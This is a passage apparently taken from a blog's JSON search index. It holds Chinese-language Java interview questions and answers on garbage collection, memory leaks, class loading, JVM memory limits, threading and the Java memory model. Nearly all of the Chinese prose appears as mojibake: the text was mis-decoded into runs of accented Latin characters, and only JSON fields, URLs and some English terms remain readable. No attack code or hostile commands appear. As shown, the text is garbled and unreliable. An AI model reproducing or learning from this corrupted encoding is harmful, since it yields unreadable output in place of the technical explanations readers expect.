†(heap)ä¸­çš„æ‰€æœ‰å¯¹è±¡ã€‚é€šè¿‡è¿™ç§æ–¹å¼ç¡®å®šå“ªäº›å¯¹è±¡æ˜¯â€å¯è¾¾çš„â€ï¼Œå“ªäº›å¯¹è±¡æ˜¯â€ä¸å¯è¾¾çš„â€ã€‚å½“GCç¡®å®šä¸€äº›å¯¹è±¡ä¸ºâ€ä¸å¯è¾¾â€æ—¶ï¼ŒGCå°±æœ‰è´£ä»»å›æ”¶è¿™äº›å†…å­˜ç©ºé—´ã€‚å¯ä»¥ã€‚ç¨‹åºå‘˜å¯ä»¥æ‰‹åŠ¨æ‰§è¡ŒSystem.gc()ï¼Œé€šçŸ¥GCè¿è¡Œï¼Œä½†æ˜¯Javaè¯­è¨€è§„èŒƒå¹¶ä¸ä¿è¯GCä¸€å®šä¼šæ‰§è¡Œã€‚ åœ¨javaä¸­ä¼šå­˜åœ¨å†…å­˜æ³„æ¼å—ï¼Ÿè¯·ç®€å•æè¿°ä¸€ä¸‹ã€‚Javaä¸­çš„ç¡®å­˜åœ¨Javaçš„å†…å­˜æ³„æ¼, å¹¶ä¸”äº‹æ€å¯ä»¥å˜å¾—ç›¸å½“ä¸¥é‡ Java garbage collectorè‡ªåŠ¨é‡Šæ”¾å“ªäº›å†…å­˜é‡Œé¢ç¨‹åºä¸åœ¨éœ€è¦çš„å¯¹è±¡, ä»¥æ­¤é¿å…å¤§å¤šæ•°çš„å…¶ä»–ç¨‹åºä¸Šä¸‹æ–‡çš„å†…å­˜æ³„æ¼. ä½†æ˜¯Javaåº”ç”¨ç¨‹åºä¾æ—§ä¼šæœ‰ç›¸å½“çš„å†…å­˜æ³„æ¼. æŸ¥æ‰¾åŸå› ä¼šååˆ†å›°éš¾.æœ‰ä¸¤ç±»ä¸»è¦çš„Javaå†…å­˜æ³„æ¼:* ä¸å†éœ€è¦çš„å¯¹è±¡å¼•ç”¨* æœªé‡Šæ”¾çš„ç³»ç»Ÿèµ„æºéå¿…è¦çš„å¯¹è±¡å¼•ç”¨Javaä»£ç å¸¸å¸¸ä¿ç•™å¯¹äºä¸å†éœ€è¦çš„å¯¹è±¡å¼•ç”¨, å¹¶ä¸”è¿™ç»„ç»‡äº†å†…å­˜çš„åƒåœ¾æ”¶é›†å™¨çš„å·¥ä½œ. Javaå¯¹è±¡é€šå¸¸è¢«å…¶ä»–å¯¹è±¡åŒ…å«å¼•ç”¨, ä¸ºæ­¤ä¸€ä¸ªå•ä¸€å¯¹è±¡å¯ä»¥ä¿æŒæ•´ä¸ªå¯¹è±¡æ ‘åœ¨å†…å­˜ä¸­, äºæ˜¯å¯¼è‡´äº†å¦‚ä¸‹é—®é¢˜:* åœ¨å‘æ•°ç»„æ·»åŠ å¯¹è±¡ä»¥åé—æ¼äº†å¯¹äºä»–ä»¬çš„å¤„ç†* ç›´åˆ°ä½ å†æ¬¡ä½¿ç”¨å¯¹è±¡çš„æ—¶å€™éƒ½ä¸é‡Šæ”¾å¼•ç”¨. æ¯”å¦‚ä¸€ä¸ªèœå•æŒ‡ä»¤å¯ä»¥æ’ä»¶ä¸€ä¸ªå¯¹è±¡å®ä¾‹å¼•ç”¨å¹¶ä¸”ä¸é‡Šæ”¾ä¾¿äºä»¥åå†æ¬¡è°ƒç”¨çš„æ—¶å€™ä½¿ç”¨, ä½†æ˜¯ä¹Ÿè®¸æ°¸è¿œä¸ä¼šå‘ç”Ÿ.* åœ¨å…¶ä»–å¼•ç”¨ä¾ç„¶éœ€è¦æ—§æœ‰çŠ¶æ€çš„æ—¶å€™è´¸ç„¶ä¿®æ”¹å¯¹è±¡çŠ¶æ€. æ¯”å¦‚å½“ä½ ä¸ºäº†åœ¨ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶é‡Œé¢ä¿å­˜ä¸€äº›å±æ€§è€Œä½¿ç”¨ä¸€ä¸ªæ•°ç»„, è¯¸å¦‚â€å­—ç¬¦ä¸ªæ•°â€ç­‰å­—æ®µåœ¨ä¸å†éœ€è¦çš„æ—¶å€™ä¾ç„¶ä¿ç•™åœ¨å†…å­˜å½“ä¸­.* å…è®¸ä¸€ä¸ªé•¿ä¹…æ‰§è¡Œçš„çº¿ç¨‹æ‰€å¼•ç”¨çš„å¯¹è±¡. è®¾ç½®å¼•ç”¨ä¸ºNULLä¹Ÿæ— æµäºäº‹, åœ¨çº¿ç¨‹é€€å‡ºå’Œç©ºé—²ä¹‹å‰, å¯¹è±¡ä¸ä¼šè¢«æ”¶é›†é‡Šæ”¾æœªé‡Šæ”¾çš„ç³»ç»Ÿèµ„æºJavaæ–¹æ³•å¯ä»¥å®šä½Javaå®ä¾‹æ„å¤–çš„å †å†…å­˜, è¯¸å¦‚é’ˆå¯¹è§†çª—å’Œä½å›¾çš„å†…å­˜èµ„æº. Javaå¸¸å¸¸é€šè¿‡JNI(Java Native Interface)è°ƒç”¨C/C++å­ç¨‹åºå®šä½è¿™äº›èµ„æº. è¯´æ˜ä¸€ä¸‹åƒåœ¾å›æ”¶çš„ä¼˜ç‚¹ä»¥åŠåŸç†ã€‚ Java è¯­è¨€ä¸­ä¸€ä¸ªæ˜¾è‘—çš„ç‰¹ç‚¹å°±æ˜¯å¼•å…¥äº†åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œä½¿c++ç¨‹åºå‘˜æœ€å¤´ç–¼çš„å†…å­˜ç®¡ç†çš„é—®é¢˜è¿åˆƒè€Œè§£ï¼Œå®ƒä½¿å¾—Javaç¨‹åºå‘˜åœ¨ç¼–å†™ç¨‹åºçš„æ—¶å€™ä¸å†éœ€è¦è€ƒè™‘å†…å­˜ç®¡ç†ã€‚ç”±äºæœ‰ä¸ªåƒåœ¾å›æ”¶æœºåˆ¶ï¼ŒJavaä¸­çš„å¯¹è±¡ä¸å†æœ‰â€ä½œç”¨åŸŸâ€çš„æ¦‚å¿µï¼Œåªæœ‰å¯¹è±¡çš„å¼•ç”¨æ‰æœ‰â€ä½œç”¨åŸŸâ€ã€‚åƒåœ¾å›æ”¶å¯ä»¥æœ‰æ•ˆçš„é˜²æ­¢å†…å­˜æ³„éœ²ï¼Œæœ‰æ•ˆçš„ä½¿ç”¨å¯ä»¥ä½¿ç”¨çš„å†…å­˜ã€‚åƒåœ¾å›æ”¶å™¨é€šå¸¸æ˜¯ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ä½çº§åˆ«çš„çº¿ç¨‹è¿è¡Œï¼Œä¸å¯é¢„çŸ¥çš„æƒ…å†µä¸‹å¯¹å†…å­˜å †ä¸­å·²ç»æ­»äº¡çš„æˆ–è€…é•¿æ—¶é—´æ²¡æœ‰ä½¿ç”¨çš„å¯¹è±¡è¿›è¡Œæ¸…æ¥šå’Œå›æ”¶ï¼Œç¨‹åºå‘˜ä¸èƒ½å®æ—¶çš„è°ƒç”¨åƒåœ¾å›æ”¶å™¨å¯¹æŸä¸ªå¯¹è±¡æˆ–æ‰€æœ‰å¯¹è±¡è¿›è¡Œåƒåœ¾å›æ”¶ã€‚å›æ”¶æœºåˆ¶æœ‰åˆ†ä»£å¤åˆ¶åƒåœ¾å›æ”¶å’Œæ ‡è®°åƒåœ¾å›æ”¶ï¼Œå¢é‡åƒåœ¾å›æ”¶ã€‚ è¯·é—®GCæ˜¯ä»€ä¹ˆ? è¿˜æœ‰ä¸ºä»€ä¹ˆè¦æœ‰GC? GCæ˜¯åƒåœ¾æ”¶é›†çš„æ„æ€ï¼ˆGabage Collectionï¼‰,å†…å­˜å¤„ç†æ˜¯ç¼–ç¨‹äººå‘˜å®¹æ˜“å‡ºç°é—®é¢˜çš„åœ°æ–¹ï¼Œå¿˜è®°æˆ–è€…é”™è¯¯çš„å†…å­˜å›æ”¶ä¼šå¯¼è‡´ç¨‹åºæˆ–ç³»ç»Ÿçš„ä¸ç¨³å®šç”šè‡³å´©æºƒï¼ŒJavaæä¾›çš„GCåŠŸèƒ½å¯ä»¥è‡ªåŠ¨ç›‘æµ‹å¯¹è±¡æ˜¯å¦è¶…è¿‡ä½œç”¨åŸŸä»è€Œè¾¾åˆ°è‡ªåŠ¨å›æ”¶å†…å­˜çš„ç›®çš„ï¼ŒJavaè¯­è¨€æ²¡æœ‰æä¾›é‡Šæ”¾å·²åˆ†é…å†…å­˜çš„æ˜¾ç¤ºæ“ä½œæ–¹æ³•ã€‚ ç®€è¿°ä¸€ä¸‹GCç®—æ³•â‘ GCï¼ˆGarbageCollection åƒåœ¾æ”¶é›†ï¼‰ï¼ŒGCçš„å¯¹è±¡æ˜¯å †ç©ºé—´å’Œæ°¸ä¹…åŒº â‘¡GCç®—æ³•åŒ…å«ï¼šå¼•ç”¨è®¡æ•°æ³•ï¼Œæ ‡è®°æ¸…é™¤ï¼Œæ ‡è®°å‹ç¼©ï¼Œå¤åˆ¶ç®—æ³•ã€‚ â‘¢å¼•ç”¨è®¡æ•°å™¨çš„å®ç°å¾ˆç®€å•ï¼Œå¯¹äºä¸€ä¸ªå¯¹è±¡Aï¼Œåªè¦æœ‰ä»»ä½•ä¸€ä¸ªå¯¹è±¡å¼•ç”¨äº†Aï¼Œåˆ™Açš„å¼•ç”¨è®¡æ•°å™¨å°±åŠ 1ï¼Œå½“å¼•ç”¨å¤±æ•ˆæ—¶ï¼Œå¼•ç”¨è®¡æ•°å™¨å°±å‡1ã€‚åªè¦å¯¹è±¡Açš„å¼•ç”¨è®¡æ•°å™¨çš„å€¼ä¸º0ï¼Œåˆ™å¯¹è±¡Aå°±ä¸å¯èƒ½å†è¢«ä½¿ç”¨ã€‚ â‘£æ ‡è®°-æ¸…é™¤ç®—æ³•æ˜¯ç°ä»£åƒåœ¾å›æ”¶ç®—æ³•çš„æ€æƒ³åŸºç¡€ã€‚æ ‡è®°-æ¸…é™¤ç®—æ³•å°†åƒåœ¾å›æ”¶åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼šæ ‡è®°é˜¶æ®µå’Œæ¸…é™¤é˜¶æ®µã€‚ä¸€ç§å¯è¡Œçš„å®ç°æ˜¯ï¼Œåœ¨æ ‡è®°é˜¶æ®µï¼Œé¦–å…ˆé€šè¿‡æ ¹èŠ‚ç‚¹ï¼Œæ ‡è®°æ‰€æœ‰ä»æ ¹èŠ‚ç‚¹å¼€å§‹çš„å¯è¾¾å¯¹è±¡ã€‚å› æ­¤ï¼Œæœªè¢«æ ‡è®°çš„å¯¹è±¡å°±æ˜¯æœªè¢«å¼•ç”¨çš„åƒåœ¾å¯¹è±¡ã€‚ç„¶åï¼Œåœ¨æ¸…é™¤é˜¶æ®µï¼Œæ¸…é™¤æ‰€æœ‰æœªè¢«æ ‡è®°çš„å¯¹è±¡ã€‚ä¸æ ‡è®°-æ¸…é™¤ç®—æ³•ç›¸æ¯”ï¼Œå¤åˆ¶ç®—æ³•æ˜¯ä¸€ç§ç›¸å¯¹é«˜æ•ˆçš„å›æ”¶æ–¹æ³•ä¸é€‚ç”¨äºå­˜æ´»å¯¹è±¡è¾ƒå¤šçš„åœºåˆå¦‚è€å¹´ä»£å°†åŸæœ‰çš„å†…å­˜ç©ºé—´åˆ†ä¸ºä¸¤å—ï¼Œæ¯æ¬¡åªä½¿ç”¨å…¶ä¸­ä¸€å—ï¼Œåœ¨åƒåœ¾å›æ”¶æ—¶ï¼Œå°†æ­£åœ¨ä½¿ç”¨çš„å†…å­˜ä¸­çš„å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°æœªä½¿ç”¨çš„å†…å­˜å—ä¸­ï¼Œä¹‹åï¼Œæ¸…é™¤æ­£åœ¨ä½¿ç”¨çš„å†…å­˜å—ä¸­çš„æ‰€æœ‰å¯¹è±¡ï¼Œäº¤æ¢ä¸¤ä¸ªå†…å­˜çš„è§’è‰²ï¼Œå®Œæˆåƒåœ¾å›æ”¶ã€‚ ä»€ä¹ˆåŸå› ä¼šå¯¼è‡´minor gcè¿è¡Œé¢‘ç¹ï¼ŸåŒæ ·çš„ï¼Œä»€ä¹ˆåŸå› åˆä¼šå¯¼è‡´minor gcè¿è¡Œå¾ˆæ…¢ï¼Ÿè¯·ç®€è¦è¯´æ˜ä¸€ä¸‹ å¯èƒ½æ˜¯å †å†…å­˜å¤ªå°ã€‚ è¯·é—®javaä¸­å†…å­˜æ³„æ¼æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿä»€ä¹ˆåœºæ™¯ä¸‹ä¼šå‡ºç°å†…å­˜æ³„æ¼çš„æƒ…å†µï¼Ÿ Javaä¸­çš„å†…å­˜æ³„éœ²ï¼Œå¹¿ä¹‰å¹¶é€šä¿—çš„è¯´ï¼Œå°±æ˜¯ï¼šä¸å†ä¼šè¢«ä½¿ç”¨çš„å¯¹è±¡çš„å†…å­˜ä¸èƒ½è¢«å›æ”¶ï¼Œå°±æ˜¯å†…å­˜æ³„éœ²ã€‚å¦‚æœé•¿ç”Ÿå‘½å‘¨æœŸçš„å¯¹è±¡æŒæœ‰çŸ­ç”Ÿå‘½å‘¨æœŸçš„å¼•ç”¨ï¼Œå°±å¾ˆå¯èƒ½ä¼šå‡ºç°å†…å­˜æ³„éœ²ã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"JVM","slug":"JVM","date":"2020-07-13T21:35:08.000Z","updated":"2021-04-11T17:11:28.222Z","comments":true,"path":"JVM/","link":"","permalink":"https://blog.kayleh.top/JVM/","excerpt":"JVM","text":"JVM ç®€å•æè¿°ä¸€ä¸‹JVMåŠ è½½classæ–‡ä»¶çš„åŸç†æ˜¯ä»€ä¹ˆ?JVMä¸­ç±»çš„è£…è½½æ˜¯ç”±ClassLoaderå’Œå®ƒçš„å­ç±»æ¥å®ç°çš„,Java ClassLoader æ˜¯ä¸€ä¸ªé‡è¦çš„Javaè¿è¡Œæ—¶ç³»ç»Ÿç»„ä»¶ã€‚å®ƒè´Ÿè´£åœ¨è¿è¡Œæ—¶æŸ¥æ‰¾å’Œè£…å…¥ç±»æ–‡ä»¶çš„ç±»ã€‚ Javaä¸­çš„æ‰€æœ‰ç±»ï¼Œéƒ½éœ€è¦ç”±ç±»åŠ è½½å™¨è£…è½½åˆ°JVMä¸­æ‰èƒ½è¿è¡Œã€‚ç±»åŠ è½½å™¨æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªç±»ï¼Œè€Œå®ƒçš„å·¥ä½œå°±æ˜¯æŠŠclassæ–‡ä»¶ä»ç¡¬ç›˜è¯»å–åˆ°å†…å­˜ä¸­ã€‚åœ¨å†™ç¨‹åºçš„æ—¶å€™ï¼Œæˆ‘ä»¬å‡ ä¹ä¸éœ€è¦å…³å¿ƒç±»çš„åŠ è½½ï¼Œå› ä¸ºè¿™äº›éƒ½æ˜¯éšå¼è£…è½½çš„ï¼Œé™¤éæˆ‘ä»¬æœ‰ç‰¹æ®Šçš„ç”¨æ³•ï¼Œåƒæ˜¯åå°„ï¼Œå°±éœ€è¦æ˜¾å¼çš„åŠ è½½æ‰€éœ€è¦çš„ç±»ã€‚ ç±»è£…è½½æ–¹å¼ï¼Œæœ‰ä¸¤ç§ï¼ˆ1ï¼‰éšå¼è£…è½½ï¼Œç¨‹åºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­å½“ç¢°åˆ°é€šè¿‡new ç­‰æ–¹å¼ç”Ÿæˆå¯¹è±¡æ—¶ï¼Œéšå¼è°ƒç”¨ç±»è£…è½½å™¨åŠ è½½å¯¹åº”çš„ç±»åˆ°jvmä¸­ï¼Œï¼ˆ2ï¼‰æ˜¾å¼è£…è½½ï¼Œé€šè¿‡class.forname()ç­‰æ–¹æ³•ï¼Œæ˜¾å¼åŠ è½½éœ€è¦çš„ç±» ,éšå¼åŠ è½½ä¸æ˜¾å¼åŠ è½½çš„åŒºåˆ«ï¼šä¸¤è€…æœ¬è´¨æ˜¯ä¸€æ ·çš„ã€‚ Javaç±»çš„åŠ è½½æ˜¯åŠ¨æ€çš„ï¼Œå®ƒå¹¶ä¸ä¼šä¸€æ¬¡æ€§å°†æ‰€æœ‰ç±»å…¨éƒ¨åŠ è½½åå†è¿è¡Œï¼Œè€Œæ˜¯ä¿è¯ç¨‹åºè¿è¡Œçš„åŸºç¡€ç±»(åƒæ˜¯åŸºç±»)å®Œå…¨åŠ è½½åˆ°jvmä¸­ï¼Œè‡³äºå…¶ä»–ç±»ï¼Œåˆ™åœ¨éœ€è¦çš„æ—¶å€™æ‰åŠ è½½ã€‚è¿™å½“ç„¶å°±æ˜¯ä¸ºäº†èŠ‚çœå†…å­˜å¼€é”€ã€‚ ä»€ä¹ˆæ˜¯Javaè™šæ‹Ÿæœºï¼Ÿä¸ºä»€ä¹ˆJavaè¢«ç§°ä½œæ˜¯â€œå¹³å°æ— å…³çš„ç¼–ç¨‹è¯­è¨€â€ï¼ŸJavaè™šæ‹Ÿæœºæ˜¯ä¸€ä¸ªå¯ä»¥æ‰§è¡ŒJavaå­—èŠ‚ç çš„è™šæ‹Ÿæœºè¿›ç¨‹ã€‚Javaæºæ–‡ä»¶è¢«ç¼–è¯‘æˆèƒ½è¢«Javaè™šæ‹Ÿæœºæ‰§è¡Œçš„å­—èŠ‚ç æ–‡ä»¶ã€‚Javaè¢«è®¾è®¡æˆå…è®¸åº”ç”¨ç¨‹åºå¯ä»¥è¿è¡Œåœ¨ä»»æ„çš„å¹³å°ï¼Œè€Œä¸éœ€è¦ç¨‹åºå‘˜ä¸ºæ¯ä¸€ä¸ªå¹³å°å•ç‹¬é‡å†™æˆ–è€…æ˜¯é‡æ–°ç¼–è¯‘ã€‚Javaè™šæ‹Ÿæœºè®©è¿™ä¸ªå˜ä¸ºå¯èƒ½ï¼Œå› ä¸ºå®ƒçŸ¥é“åº•å±‚ç¡¬ä»¶å¹³å°çš„æŒ‡ä»¤é•¿åº¦å’Œå…¶ä»–ç‰¹æ€§ã€‚ jvmæœ€å¤§å†…å­˜é™åˆ¶å¤šå°‘ï¼Ÿ(1)å †å†…å­˜åˆ†é… JVMåˆå§‹åˆ†é…çš„å†…å­˜ç”±-XmsæŒ‡å®šï¼Œé»˜è®¤æ˜¯ç‰©ç†å†…å­˜çš„1/64ï¼›JVMæœ€å¤§åˆ†é…çš„å†…å­˜ç”±-XmxæŒ‡å®šï¼Œé»˜è®¤æ˜¯ç‰©ç†å†…å­˜çš„1/4ã€‚é»˜è®¤ç©ºä½™å †å†…å­˜å° äº40%æ—¶ï¼ŒJVMå°±ä¼šå¢å¤§å †ç›´åˆ°-Xmxçš„æœ€å¤§é™åˆ¶ï¼›ç©ºä½™å †å†…å­˜å¤§äº70%æ—¶ï¼ŒJVMä¼šå‡å°‘å †ç›´åˆ°-Xmsçš„æœ€å°é™åˆ¶ã€‚å› æ­¤æœåŠ¡å™¨ä¸€èˆ¬è®¾ç½®-Xmsã€ -Xmxç›¸ç­‰ä»¥é¿å…åœ¨æ¯æ¬¡GCåè°ƒæ•´å †çš„å¤§å°ã€‚ (2)éå †å†…å­˜åˆ†é… JVMä½¿ç”¨-XX:PermSizeè®¾ç½®éå †å†…å­˜åˆå§‹å€¼ï¼Œé»˜è®¤æ˜¯ç‰©ç†å†…å­˜çš„1/64ï¼›ç”±XX:MaxPermSizeè®¾ç½®æœ€å¤§éå †å†…å­˜çš„å¤§å°ï¼Œé»˜è®¤æ˜¯ç‰©ç†å†…å­˜çš„1/4ã€‚ (3)VMæœ€å¤§å†…å­˜ é¦–å…ˆJVMå†…å­˜é™åˆ¶äºå®é™…çš„æœ€å¤§ç‰©ç†å†…å­˜ï¼Œå‡è®¾ç‰©ç†å†…å­˜æ— é™å¤§çš„è¯ï¼ŒJVMå†…å­˜çš„æœ€å¤§å€¼è·Ÿæ“ä½œç³»ç»Ÿæœ‰å¾ˆå¤§çš„å…³ç³»ã€‚ç®€å•çš„è¯´å°±32ä½å¤„ç†å™¨è™½ ç„¶å¯æ§å†…å­˜ç©ºé—´æœ‰4GB,ä½†æ˜¯å…·ä½“çš„æ“ä½œç³»ç»Ÿä¼šç»™ä¸€ä¸ªé™åˆ¶ï¼Œè¿™ä¸ªé™åˆ¶ä¸€èˆ¬æ˜¯2GB-3GBï¼ˆä¸€èˆ¬æ¥è¯´Windowsç³»ç»Ÿä¸‹ä¸º1.5G-2Gï¼ŒLinuxç³» ç»Ÿä¸‹ä¸º2G-3Gï¼‰ï¼Œè€Œ64bitä»¥ä¸Šçš„å¤„ç†å™¨å°±ä¸ä¼šæœ‰é™åˆ¶äº†ã€‚ (3)ä¸‹é¢æ˜¯å½“å‰æ¯”è¾ƒæµè¡Œçš„å‡ ä¸ªä¸åŒå…¬å¸ä¸åŒç‰ˆæœ¬JVMæœ€å¤§å †å†…å­˜: jvmæ˜¯å¦‚ä½•å®ç°çº¿ç¨‹çš„ï¼Ÿçº¿ç¨‹æ˜¯æ¯”è¿›ç¨‹æ›´è½»é‡çº§çš„è°ƒåº¦æ‰§è¡Œå•ä½ã€‚çº¿ç¨‹å¯ä»¥æŠŠä¸€ä¸ªè¿›ç¨‹çš„èµ„æºåˆ†é…å’Œæ‰§è¡Œè°ƒåº¦åˆ†å¼€ã€‚ä¸€ä¸ªè¿›ç¨‹é‡Œå¯ä»¥å¯åŠ¨å¤šæ¡çº¿ç¨‹ï¼Œå„ä¸ªçº¿ç¨‹å¯å…±äº«è¯¥è¿›ç¨‹çš„èµ„æº(å†…å­˜åœ°å€ï¼Œæ–‡ä»¶IOç­‰)ï¼Œåˆå¯ä»¥ç‹¬ç«‹è°ƒåº¦ã€‚çº¿ç¨‹æ˜¯CPUè°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚ ä¸»æµOSéƒ½æä¾›çº¿ç¨‹å®ç°ã€‚Javaè¯­è¨€æä¾›å¯¹çº¿ç¨‹æ“ä½œçš„åŒä¸€APIï¼Œæ¯ä¸ªå·²ç»æ‰§è¡Œstart()ï¼Œä¸”è¿˜æœªç»“æŸçš„java.lang.Threadç±»çš„å®ä¾‹ï¼Œä»£è¡¨äº†ä¸€ä¸ªçº¿ç¨‹ã€‚ Threadç±»çš„å…³é”®æ–¹æ³•ï¼Œéƒ½å£°æ˜ä¸ºNativeã€‚è¿™æ„å‘³ç€è¿™ä¸ªæ–¹æ³•æ— æ³•æˆ–æ²¡æœ‰ä½¿ç”¨å¹³å°æ— å…³çš„æ‰‹æ®µæ¥å®ç°ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸ºäº†æ‰§è¡Œæ•ˆç‡ã€‚ å®ç°çº¿ç¨‹çš„æ–¹å¼ A.ä½¿ç”¨å†…æ ¸çº¿ç¨‹å®ç°å†…æ ¸çº¿ç¨‹(Kernel-Level Thread, KLT)å°±æ˜¯ç›´æ¥ç”±æ“ä½œç³»ç»Ÿå†…æ ¸æ”¯æŒçš„çº¿ç¨‹ã€‚ å†…æ ¸æ¥å®Œæˆçº¿ç¨‹åˆ‡æ¢ å†…æ ¸é€šè¿‡è°ƒåº¦å™¨Schedulerè°ƒåº¦çº¿ç¨‹ï¼Œå¹¶å°†çº¿ç¨‹çš„ä»»åŠ¡æ˜ å°„åˆ°å„ä¸ªCPUä¸Š ç¨‹åºä½¿ç”¨å†…æ ¸çº¿ç¨‹çš„é«˜çº§æ¥å£ï¼Œè½»é‡çº§è¿›ç¨‹(Light Weight Process,LWP) ç”¨æˆ·æ€å’Œå†…æ ¸æ€åˆ‡æ¢æ¶ˆè€—å†…æ ¸èµ„æº ä½¿ç”¨ç”¨æˆ·çº¿ç¨‹å®ç° ç³»ç»Ÿå†…æ ¸ä¸èƒ½æ„ŸçŸ¥çº¿ç¨‹å­˜åœ¨çš„å®ç° ç”¨æˆ·çº¿ç¨‹çš„å»ºç«‹ã€åŒæ­¥ã€é”€æ¯å’Œè°ƒåº¦å®Œå…¨åœ¨ç”¨æˆ·æ€ä¸­å®Œæˆ æ‰€æœ‰çº¿ç¨‹æ“ä½œéœ€è¦ç”¨æˆ·ç¨‹åºè‡ªå·±å¤„ç†ï¼Œå¤æ‚åº¦é«˜ ç”¨æˆ·çº¿ç¨‹åŠ è½»é‡çº§è¿›ç¨‹æ··åˆå®ç° è½»é‡çº§è¿›ç¨‹ä½œä¸ºç”¨æˆ·çº¿ç¨‹å’Œå†…æ ¸çº¿ç¨‹ä¹‹é—´çš„æ¡¥æ¢ ä»€ä¹ˆæ˜¯JVMå†…å­˜æ¨¡å‹ï¼ŸJavaå†…å­˜æ¨¡å‹(ç®€ç§°JMM)ï¼ŒJMMå†³å®šä¸€ä¸ªçº¿ç¨‹å¯¹å…±äº«å˜é‡çš„å†™å…¥ä½•æ—¶å¯¹å¦ä¸€ä¸ªçº¿ç¨‹å¯è§ã€‚ä»æŠ½è±¡çš„è§’åº¦æ¥çœ‹ï¼ŒJMMå®šä¹‰äº†çº¿ç¨‹å’Œä¸»å†…å­˜ä¹‹é—´çš„æŠ½è±¡å…³ç³»ï¼šçº¿ç¨‹ä¹‹é—´çš„å…±äº«å˜é‡å­˜å‚¨åœ¨ä¸»å†…å­˜ï¼ˆmain memoryï¼‰ä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªç§æœ‰çš„æœ¬åœ°å†…å­˜ï¼ˆlocal memoryï¼‰ï¼Œæœ¬åœ°å†…å­˜ä¸­å­˜å‚¨äº†è¯¥çº¿ç¨‹ä»¥è¯»/å†™å…±äº«å˜é‡çš„å‰¯æœ¬ã€‚ æœ¬åœ°å†…å­˜æ˜¯JMMçš„ä¸€ä¸ªæŠ½è±¡æ¦‚å¿µï¼Œå¹¶ä¸çœŸå®å­˜åœ¨ã€‚å®ƒæ¶µç›–äº†ç¼“å­˜ï¼Œå†™ç¼“å†²åŒºï¼Œå¯„å­˜å™¨ä»¥åŠå…¶ä»–çš„ç¡¬ä»¶å’Œç¼–è¯‘å™¨ä¼˜åŒ–ã€‚å…¶å…³ç³»æ¨¡å‹å›¾å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š åœ¨JAVAè™šæ‹Ÿæœºä¸­ï¼Œå“ªäº›å¯¹è±¡å¯ä½œä¸ºROOTå¯¹è±¡ï¼Ÿè™šæ‹Ÿæœºæ ˆä¸­çš„å¼•ç”¨å¯¹è±¡ æ–¹æ³•åŒºä¸­ç±»é™æ€å±æ€§å¼•ç”¨çš„å¯¹è±¡ æ–¹æ³•åŒºä¸­å¸¸é‡å¼•ç”¨å¯¹è±¡ æœ¬åœ°æ–¹æ³•æ ˆä¸­JNIå¼•ç”¨å¯¹è±¡ GCä¸­å¦‚ä½•åˆ¤æ–­å¯¹è±¡æ˜¯å¦éœ€è¦è¢«å›æ”¶ï¼Ÿå³ä½¿åœ¨å¯è¾¾æ€§åˆ†æç®—æ³•ä¸­ä¸å¯è¾¾çš„å¯¹è±¡,ä¹Ÿå¹¶éæ˜¯â€œéå›æ”¶ä¸å¯â€çš„,è¿™æ—¶å€™å®ƒä»¬æš‚æ—¶å¤„äºâ€œç­‰å¾…â€é˜¶æ®µ,è¦çœŸæ­£å®£å‘Šä¸€ä¸ªå¯¹è±¡å›æ”¶,è‡³å°‘è¦ç»å†ä¸¤æ¬¡æ ‡è®°è¿‡ç¨‹:å¦‚æœå¯¹è±¡åœ¨è¿›è¡Œå¯è¾¾æ€§åˆ†æåå‘ç°æ²¡æœ‰ä¸GC Rootsç›¸è¿æ¥çš„å¼•ç”¨é“¾,é‚£å®ƒå°†ä¼šè¢«ç¬¬ä¸€æ¬¡æ ‡è®°å¹¶ä¸”è¿›è¡Œä¸€æ¬¡ç­›é€‰,ç­›é€‰çš„æ¡ä»¶æ˜¯æ­¤å¯¹è±¡æ˜¯å¦æœ‰å¿…è¦æ‰§è¡Œfinalize()æ–¹æ³•ã€‚å½“å¯¹è±¡æ²¡æœ‰è¦†ç›–finalize()æ–¹æ³•,æˆ–è€…finalize()æ–¹æ³•å·²ç»è¢«è™šæ‹Ÿæœºè°ƒç”¨è¿‡,è™šæ‹Ÿæœºå°†è¿™ä¸¤ç§æƒ…å†µéƒ½è§†ä¸ºâ€œæ²¡æœ‰å¿…è¦æ‰§è¡Œâ€ã€‚(å³æ„å‘³ç€ç›´æ¥å›æ”¶) å¦‚æœè¿™ä¸ªå¯¹è±¡è¢«åˆ¤å®šä¸ºæœ‰å¿…è¦æ‰§è¡Œfinalize()æ–¹æ³•,é‚£ä¹ˆè¿™ä¸ªå¯¹è±¡å°†ä¼šæ”¾ç½®åœ¨ä¸€ä¸ªå«åšF-Queueçš„é˜Ÿåˆ—ä¹‹ä¸­,å¹¶åœ¨ç¨åç”±ä¸€ä¸ªç”±è™šæ‹Ÿæœºè‡ªåŠ¨å»ºç«‹çš„ã€ä½ä¼˜å…ˆçº§çš„Finalizerçº¿ç¨‹å»æ‰§è¡Œå®ƒã€‚è¿™é‡Œæ‰€è°“çš„â€œæ‰§è¡Œâ€æ˜¯æŒ‡è™šæ‹Ÿæœºä¼šè§¦å‘è¿™ä¸ªæ–¹æ³•,ä½†å¹¶ä¸æ‰¿è¯ºä¼šç­‰å¾…å®ƒè¿è¡Œç»“æŸ,è¿™æ ·åšçš„åŸå› æ˜¯,å¦‚æœä¸€ä¸ªå¯¹è±¡åœ¨finalize()æ–¹æ³•ä¸­æ‰§è¡Œç¼“æ…¢,æˆ–è€…å‘ç”Ÿäº†æ­»å¾ªç¯(æ›´æç«¯çš„æƒ…å†µ),å°†å¾ˆå¯èƒ½ä¼šå¯¼è‡´F-Queueé˜Ÿåˆ—ä¸­å…¶ä»–å¯¹è±¡æ°¸ä¹…å¤„äºç­‰å¾…,ç”šè‡³å¯¼è‡´æ•´ä¸ªå†…å­˜å›æ”¶ç³»ç»Ÿå´©æºƒã€‚ 